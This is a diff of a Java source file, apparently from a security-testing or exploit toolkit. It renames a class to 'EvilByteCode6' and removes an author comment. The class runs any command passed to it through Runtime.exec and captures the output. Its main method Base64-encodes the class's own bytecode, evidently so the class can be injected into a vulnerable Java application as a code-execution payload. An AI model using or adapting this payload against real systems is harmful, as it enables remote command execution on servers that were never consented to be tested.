@@ -4,14 +4,11 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.util.Base64;
 
-/**
- * @author threedr3am
- */
-public class Threedr3am_6 {
+public class EvilByteCode6 {
 
     String res;
 
-    public Threedr3am_6(String cmd) throws IOException {
+    public EvilByteCode6(String cmd) throws IOException {
         StringBuilder stringBuilder = new StringBuilder();
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
         String line;
@@ -27,7 +24,7 @@ public class Threedr3am_6 {
     }
 
     public static void main(String[] args) throws IOException {
-        InputStream inputStream = Threedr3am_6.class.getClassLoader().getResourceAsStream("Threedr3am_6.class");
+        InputStream inputStream = EvilByteCode6.class.getClassLoader().getResourceAsStream("EvilByteCode6.class");
         byte[] bytes = new byte[inputStream.available()];
         inputStream.read(bytes);
         String code = Base64.getEncoder().encodeToString(bytes);
